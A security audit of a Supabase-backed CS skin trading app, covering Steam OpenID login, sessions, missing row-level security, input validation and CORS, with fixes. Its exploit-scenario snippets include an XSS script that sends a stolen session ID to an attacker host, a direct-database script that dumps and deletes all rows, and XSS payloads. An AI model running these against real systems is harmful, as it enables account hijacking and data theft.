# 🔐 CS Trading Hub - Complete Security Analysis

## 📋 **Executive Summary**

Your application uses a **3-tier architecture**: Frontend → Backend (Supabase Edge Functions) → Database (Postgres KV Store)

**Current Security Status:** ⚠️ **MODERATE - Requires Immediate Attention**

- ✅ **Good:** Backend authentication, session management, Steam OAuth
- ⚠️ **Concerning:** No Row Level Security (RLS), exposed credentials, race conditions
- ❌ **Critical:** Direct database access possible, no input sanitization

---

## 🏗️ **Architecture Overview**

```
┌─────────────────────────────────────────────────────────────┐
│                         FRONTEND                            │
│  • React/TypeScript running in browser                      │
│  • Contains: publicAnonKey (exposed - expected)             │
│  • Session ID stored in localStorage                        │
│  • API calls to backend with Bearer token + Session ID      │
└─────────────────────────┬───────────────────────────────────┘
                          │
                          │ HTTPS + CORS
                          │
┌─────────────────────────▼───────────────────────────────────┐
│                  BACKEND (Supabase Edge Functions)           │
│  • Hono web server in Deno runtime                          │
│  • Contains: STEAM_API_KEY, SERVICE_ROLE_KEY (secure)       │
│  • Session validation via X-Session-ID header               │
│  • Steam OpenID verification                                 │
│  • Rate limiting (5s per user for inventory)                │
└─────────────────────────┬───────────────────────────────────┘
                          │
                          │ Internal Network
                          │
┌─────────────────────────▼───────────────────────────────────┐
│                  DATABASE (Postgres)                         │
│  • Single table: kv_store_e2cf3727                          │
│  • RLS Status: ⚠️ LIKELY DISABLED (not verified)           │
│  • Accessed via: SERVICE_ROLE_KEY (bypasses RLS)            │
│  • Key-Value structure: { key: TEXT, value: JSONB }         │
└─────────────────────────────────────────────────────────────┘
```

---

## 🔑 **Authentication & Authorization**

### **1. Steam OpenID Authentication**

**Flow:**
1. User clicks "Login with Steam"
2. Frontend calls `/steam/login` → Backend generates OpenID URL
3. User redirected to Steam's login page
4. Steam redirects back to `/steam-callback` with OpenID params
5. Backend verifies OpenID signature (optional - often fails due to encoding)
6. Backend extracts Steam ID from `openid.claimed_id`
7. Backend fetches user profile from Steam API
8. Backend creates session with UUID, stores in KV store
9. Session ID returned to frontend, stored in localStorage

**Security Assessment:**

✅ **Strengths:**
- Uses official Steam OpenID protocol
- Session IDs are UUIDs (high entropy, unguessable)
- Sessions expire after 7 days
- Backend handles all verification (frontend never sees API key)

⚠️ **Weaknesses:**
- **OpenID signature verification is skipped if it fails** (lines 166-175 in steam.tsx)
  - Comment says: "accepting Steam ID from trusted redirect"
  - Risk: If Steam's redirect can be spoofed, attacker could login as anyone
  - Mitigation: Redirect comes from Steam's servers (hard to spoof), but not ideal
- **No CSRF protection on callback**
  - An attacker could trick a user into loading a callback URL with attacker's Steam ID
  - User would be logged in as the attacker
- **Session ID in localStorage** (not httpOnly cookie)
  - Vulnerable to XSS attacks
  - If attacker injects JS, they can steal session ID

❌ **Critical Issues:**
- **No verification that Steam redirect actually came from Steam**
  - Relies solely on extracting Steam ID from URL parameter
  - Could accept any `openid.claimed_id` parameter if encoding matches

**Exploit Scenario:**
```typescript
// Attacker crafts a malicious callback URL
const attackerSteamId = "76561198000000000";
const maliciousUrl = `https://yourapp.com/steam-callback?openid.claimed_id=https://steamcommunity.com/openid/id/${attackerSteamId}&openid.mode=id_res&...`;

// Tricks victim into clicking link (phishing, social engineering)
// Victim is now logged in as attacker
// Attacker can see victim's actions, messages, etc.
```

**Recommended Fixes:**
1. **Add state parameter to OpenID request** (CSRF protection)
2. **Enforce signature verification** - Don't skip on failure
3. **Use httpOnly cookies** instead of localStorage for session
4. **Add session fingerprinting** (IP address, User-Agent)

---

### **2. Session Management**

**Current Implementation:**

```typescript
// Session stored in KV store
session:{sessionId} → {
  steamId: "76561198...",
  personaName: "PlayerName",
  avatarUrl: "https://...",
  profileUrl: "https://...",
  expiresAt: 1234567890000  // Unix timestamp
}

// Session ID stored in localStorage
localStorage.getItem('steam_session_id')
```

**Security Assessment:**

✅ **Strengths:**
- Session IDs are UUIDs (cryptographically random)
- Sessions have expiration (7 days)
- Backend validates session on every request
- Invalid/expired sessions are rejected with 401

⚠️ **Weaknesses:**
- **localStorage is not secure**
  - Accessible to any JavaScript on the page
  - Persists across browser sessions
  - Vulnerable to XSS
- **No session revocation mechanism**
  - If user's session is stolen, no way to invalidate it (except logout from same device)
- **No "remember me" vs "session" distinction**
  - All sessions last 7 days (no option for shorter-lived sessions)
- **Expired sessions never cleaned up**
  - Dead sessions accumulate in database forever

❌ **Critical Issues:**
- **Session ID transmitted in custom header** (`X-Session-ID`)
  - Not standard (should use Authorization header or cookie)
  - Custom headers don't have automatic CSRF protection
- **No session binding to device/browser**
  - Same session ID can be used from multiple locations simultaneously
  - No detection of session hijacking

**Exploit Scenario:**
```javascript
// XSS attack - attacker injects this script
const stolenSession = localStorage.getItem('steam_session_id');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ session: stolenSession })
});

// Now attacker can make requests as the victim
fetch('https://yourapp.supabase.co/functions/v1/make-server-e2cf3727/offers/create', {
  headers: {
    'X-Session-ID': stolenSession,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ malicious: 'offer' })
});
```

**Recommended Fixes:**
1. **Use httpOnly cookies** for session storage
2. **Add session binding** (IP, User-Agent hash)
3. **Implement session refresh tokens** (short-lived access tokens)
4. **Add session activity logging** (last seen, IP address)
5. **Implement "logout all devices"** feature
6. **Clean up expired sessions** (background job)

---

### **3. Authorization Checks**

**Current Implementation:**

Every protected endpoint checks:
```typescript
const sessionId = c.req.header('X-Session-ID');
if (!sessionId) {
  return c.json({ error: 'No session ID provided' }, 401);
}

const session = await kv.get(`session:${sessionId}`);
if (!session || !session.steamId) {
  return c.json({ error: 'Invalid session' }, 401);
}

// Check expiration
if (session.expiresAt < Date.now()) {
  await kv.del(`session:${sessionId}`);
  return c.json({ error: 'Session expired' }, 401);
}
```

**Security Assessment:**

✅ **Strengths:**
- Consistent auth pattern across endpoints
- Validates session existence and expiration
- Returns proper HTTP status codes (401 for auth errors)
- Checks ownership before deleting/updating offers

⚠️ **Weaknesses:**
- **No role-based access control (RBAC)**
  - All authenticated users have same permissions
  - No admin/moderator roles
- **No rate limiting per user** (except inventory fetching)
  - User could spam offer creation
- **No IP-based blocking** for abuse
- **Reputation system has no verification**
  - Anyone can vote on anyone (no proof of trade)

❌ **Critical Issues:**
- **Time-of-check to time-of-use (TOCTOU) race condition**
  ```typescript
  // Thread 1: Check ownership
  const offer = await kv.get(`offer:${offerId}`);
  if (offer.userId !== session.steamId) { return 403; }
  
  // Thread 2: Update offer owner (malicious concurrent request)
  
  // Thread 1: Delete offer (now owned by someone else!)
  await kv.del(`offer:${offerId}`);
  ```
  No atomic operations or transactions

**Recommended Fixes:**
1. **Add rate limiting per user** (max 10 offers created per hour)
2. **Implement atomic operations** (use Postgres transactions)
3. **Add abuse detection** (flag suspicious patterns)
4. **Implement reputation system verification** (link to actual trades)
5. **Add admin/moderator roles** for content moderation

---

## 🔒 **Row Level Security (RLS)**

### **Current Status: ⚠️ LIKELY DISABLED**

**The Problem:**

Your Supabase database table `kv_store_e2cf3727` likely has RLS **disabled** by default. This means:

❌ **Anyone with the `publicAnonKey` can query the database directly**

The `publicAnonKey` is exposed in your frontend code:
```typescript
// /utils/supabase/info.tsx (exposed to all users)
export const publicAnonKey = "eyJhbGc...";
```

**Attack Vector:**

```typescript
// Attacker opens your app, extracts publicAnonKey from Network tab
import { createClient } from '@supabase/supabase-js';

const supabase = createClient(
  'https://fjouoltxkrdoxznodqzb.supabase.co',
  'eyJhbGc...' // Your public key
);

// Bypass all backend security and read EVERYTHING
const { data } = await supabase
  .from('kv_store_e2cf3727')
  .select('*');

// Now attacker has:
// - All user sessions (can hijack accounts)
// - All trade URLs (sensitive!)
// - All offers (including private notes)
// - All trade requests (including messages)
// - All reputation data

// Attacker can also WRITE malicious data
await supabase.from('kv_store_e2cf3727').insert({
  key: 'offer:fake-uuid',
  value: { malicious: 'offer' }
});

// Or DELETE everything
await supabase.from('kv_store_e2cf3727').delete().neq('key', '');
```

**Why Your Backend Security Doesn't Matter:**

Your backend has good auth checks, but they only protect the backend API routes. They don't protect **direct database access**.

### **Immediate Fix Required:**

```sql
-- 1. Enable RLS on the table
ALTER TABLE kv_store_e2cf3727 ENABLE ROW LEVEL SECURITY;

-- 2. Block all anon access (force users to go through backend)
CREATE POLICY "Block all anon access"
ON kv_store_e2cf3727
FOR ALL
TO anon
USING (false)
WITH CHECK (false);

-- 3. Allow service role full access (your backend)
CREATE POLICY "Service role full access"
ON kv_store_e2cf3727
FOR ALL
TO service_role
USING (true)
WITH CHECK (true);
```

**After this fix:**
- ✅ Backend still works (uses service role key)
- ❌ Direct database queries with anon key are blocked
- ✅ Users must go through your backend (with auth checks)

---

## 🛡️ **Input Validation & Sanitization**

### **Current Status: ❌ MINIMAL TO NONE**

**Examples of Missing Validation:**

#### 1. **Offer Creation - No Schema Validation**
```typescript
// Line 468-477 in index.tsx
const { offering, seeking, notes } = body;

// Only checks:
if (!offering || !Array.isArray(offering) || offering.length === 0) { ... }
if (!seeking || !Array.isArray(seeking) || seeking.length === 0) { ... }

// DOES NOT CHECK:
// - What's inside the arrays?
// - Is each item an object with required fields?
// - Are strings properly bounded (max length)?
// - Are there script tags in notes? (XSS)
```

**Attack:**
```typescript
// Malicious offer
fetch('/offers/create', {
  body: JSON.stringify({
    offering: [
      { name: "<script>alert('XSS')</script>" },
      { name: "A".repeat(1000000) }, // 1MB string crashes app
      { price: -999999 }, // Negative price
      { malicious: "payload" }
    ],
    seeking: ["not-an-object", 123, null, undefined],
    notes: "<img src=x onerror='stealCookies()'>"
  })
});
```

#### 2. **Trade URL - Weak Validation**
```typescript
// Line 181-184 in index.tsx
const tradeUrlPattern = /^https:\/\/steamcommunity\.com\/tradeoffer\/new\/\?partner=\d+&token=[\w-]+$/;
```

**Issues:**
- ✅ Good: Checks format
- ❌ Problem: Doesn't validate that partner ID matches user's Steam ID
- ❌ Problem: User could set someone else's trade URL
- ❌ Problem: No check for malicious query parameters

#### 3. **Reputation Voting - No Proof Required**
```typescript
// Line 854-863 in index.tsx
const { targetSteamId, voteType } = body;

// Only checks:
if (targetSteamId === session.steamId) {
  return c.json({ error: 'Cannot vote for yourself' }, 400);
}

// DOES NOT CHECK:
// - Did voter actually trade with target?
// - Is there an offer/request between these users?
// - Voting multiple times from different accounts?
```

**Attack:**
```typescript
// Attacker creates 100 accounts
for (let i = 0; i < 100; i++) {
  // Vote "reversed" on competitor
  await vote(competitorSteamId, 'reversed');
}
// Competitor now has 0% completion rate, destroyed reputation
```

#### 4. **JSON Injection in Notes**
```typescript
// Notes field is stored as-is, no sanitization
notes: "Normal trade\\n\\n\",\"userId\":\"ADMIN\",\"isAdmin\":true,\"//";

// When stored in JSONB and retrieved, could manipulate object structure
```

### **Recommended Validation:**

```typescript
import { z } from 'zod'; // Use Zod for schema validation

// Define schemas
const ItemSchema = z.object({
  name: z.string().min(1).max(200),
  wear: z.enum(['Factory New', 'Minimal Wear', 'Field-Tested', 'Well-Worn', 'Battle-Scarred']).optional(),
  price: z.number().min(0).max(1000000).optional(),
  image: z.string().url().optional(),
});

const OfferSchema = z.object({
  offering: z.array(ItemSchema).min(1).max(50),
  seeking: z.array(ItemSchema).min(1).max(50),
  notes: z.string().max(5000).optional(),
});

// Use in endpoint
const body = await c.req.json();
const validated = OfferSchema.parse(body); // Throws if invalid

// Sanitize HTML in notes
import DOMPurify from 'dompurify';
validated.notes = DOMPurify.sanitize(validated.notes);
```

---

## 🌐 **Network Security**

### **CORS Configuration**

```typescript
// Line 13-22 in index.tsx
app.use("/*", cors({
  origin: "*",  // ⚠️ ALLOWS ANY ORIGIN
  allowHeaders: ["Content-Type", "Authorization", "X-Session-ID"],
  allowMethods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
}));
```

**Issues:**
- ❌ **`origin: "*"` allows requests from ANY website**
  - Attacker can create `evil.com` and make requests to your API
  - CSRF attacks possible
- ❌ **No origin whitelist**

**Recommended Fix:**
```typescript
const ALLOWED_ORIGINS = [
  'https://yourapp.com',
  'https://www.yourapp.com',
  'http://localhost:3000', // Dev only
];

app.use("/*", cors({
  origin: (origin) => {
    if (!origin || ALLOWED_ORIGINS.includes(origin)) {
      return origin;
    }
    return false; // Reject
  },
  credentials: true, // Allow cookies
}));
```

### **HTTPS Enforcement**

✅ **Good:** Supabase Edge Functions are HTTPS-only by default

### **API Rate Limiting**

⚠️ **Partial:**
- Inventory fetching: 5 seconds per user (line 244 in steam.tsx)
- **No rate limiting on:**
  - Offer creation (spam possible)
  - Reputation voting (abuse possible)
  - Profile updates
  - API calls in general

**Recommended:**
```typescript
import { RateLimiter } from 'limiter';

// 10 requests per minute per IP
const limiter = new RateLimiter({ tokensPerInterval: 10, interval: 'minute' });

app.use(async (c, next) => {
  const ip = c.req.header('CF-Connecting-IP') || c.req.header('X-Forwarded-For');
  
  if (!await limiter.tryRemoveTokens(1)) {
    return c.json({ error: 'Rate limit exceeded' }, 429);
  }
  
  await next();
});
```

---

## 🔐 **Secrets Management**

### **Current Setup:**

```typescript
// Frontend (exposed - EXPECTED)
/utils/supabase/info.tsx:
  export const publicAnonKey = "eyJ...";
  export const projectId = "fjou...";

// Backend (secure - hidden)
Deno.env.get('STEAM_API_KEY')
Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')
Deno.env.get('SUPABASE_URL')
```

**Security Assessment:**

✅ **Good Practices:**
- Service role key never exposed to frontend
- Steam API key only used in backend
- Environment variables properly isolated

⚠️ **Concerns:**
- **publicAnonKey visible in frontend code**
  - This is EXPECTED for Supabase
  - But requires RLS to be enabled for protection
  - Without RLS, this key gives full database access
- **No key rotation policy**
- **No audit logging for key usage**

---

## 🐛 **Vulnerabilities Summary**

### **Critical (Fix Immediately)**

| Vulnerability | Impact | Exploitability | Fix Priority |
|--------------|--------|----------------|--------------|
| **No Row Level Security** | Data breach | Easy | 🔴 CRITICAL |
| **OpenID signature skipped** | Account takeover | Medium | 🔴 CRITICAL |
| **No input validation** | XSS, DoS, data corruption | Easy | 🔴 CRITICAL |
| **CORS allows any origin** | CSRF attacks | Easy | 🟠 HIGH |

### **High (Fix Soon)**

| Vulnerability | Impact | Exploitability | Fix Priority |
|--------------|--------|----------------|--------------|
| **Session in localStorage** | Session hijacking via XSS | Medium | 🟠 HIGH |
| **No CSRF protection** | Unauthorized actions | Medium | 🟠 HIGH |
| **Race conditions** | Data corruption | Hard | 🟠 HIGH |
| **Reputation not verified** | Reputation manipulation | Easy | 🟠 HIGH |

### **Medium (Fix Eventually)**

| Vulnerability | Impact | Exploitability | Fix Priority |
|--------------|--------|----------------|--------------|
| **No rate limiting** | DoS, spam | Easy | 🟡 MEDIUM |
| **No session fingerprinting** | Session hijacking | Medium | 🟡 MEDIUM |
| **Data duplication** | Inconsistency | N/A | 🟡 MEDIUM |
| **No audit logs** | No incident response | N/A | 🟡 MEDIUM |

---

## ✅ **Immediate Action Plan**

### **Week 1: Critical Fixes**

1. **Enable RLS on database** (30 minutes)
   ```sql
   ALTER TABLE kv_store_e2cf3727 ENABLE ROW LEVEL SECURITY;
   CREATE POLICY "block_anon" ON kv_store_e2cf3727 FOR ALL TO anon USING (false);
   CREATE POLICY "allow_service" ON kv_store_e2cf3727 FOR ALL TO service_role USING (true);
   ```

2. **Add input validation** (2 hours)
   - Install Zod: `npm install zod`
   - Create schemas for offers, items, requests
   - Validate all inputs before storing

3. **Fix CORS** (30 minutes)
   - Replace `origin: "*"` with whitelist
   - Add your production domain(s)

4. **Add HTML sanitization** (1 hour)
   - Install DOMPurify
   - Sanitize all user-generated content (notes, names)

### **Week 2: High Priority**

5. **Enforce OpenID verification** (2 hours)
   - Don't skip signature verification
   - Add state parameter for CSRF protection
   - Reject if verification fails

6. **Add rate limiting** (2 hours)
   - Global rate limiter: 100 req/min per IP
   - Offer creation: 10 per hour per user
   - Reputation voting: 50 per day per user

7. **Move to httpOnly cookies** (4 hours)
   - Refactor session storage from localStorage to cookies
   - Add SameSite and Secure flags

### **Week 3: Medium Priority**

8. **Add session fingerprinting** (2 hours)
9. **Implement session refresh tokens** (4 hours)
10. **Add audit logging** (2 hours)
11. **Reputation system verification** (4 hours)

---

## 📊 **Security Scorecard**

| Category | Score | Details |
|----------|-------|---------|
| **Authentication** | 6/10 | Good flow, but OpenID verification bypassed |
| **Authorization** | 7/10 | Consistent checks, but no RBAC or verification |
| **Data Protection** | 3/10 | ⚠️ No RLS, direct DB access possible |
| **Input Validation** | 2/10 | Minimal validation, no sanitization |
| **Session Security** | 5/10 | Good expiry, but localStorage is risky |
| **Network Security** | 6/10 | HTTPS only, but CORS too permissive |
| **Rate Limiting** | 3/10 | Only on inventory, missing elsewhere |
| **Secrets Management** | 8/10 | Good separation, but no rotation |
| **Audit Logging** | 1/10 | No logging at all |

**Overall Score: 4.6/10 - Needs Improvement**

---

## 🎯 **Final Recommendations**

1. **Enable RLS TODAY** - This is your #1 vulnerability
2. **Add input validation THIS WEEK** - Prevents multiple attack vectors
3. **Fix CORS THIS WEEK** - Easy win for security
4. **Plan migration from KV store to proper tables** - Better security, performance, and scalability
5. **Implement monitoring and alerting** - Detect attacks in real-time

Your architecture is solid, but the implementation has several security gaps. Most are fixable with small changes. The RLS issue is critical and should be addressed immediately.
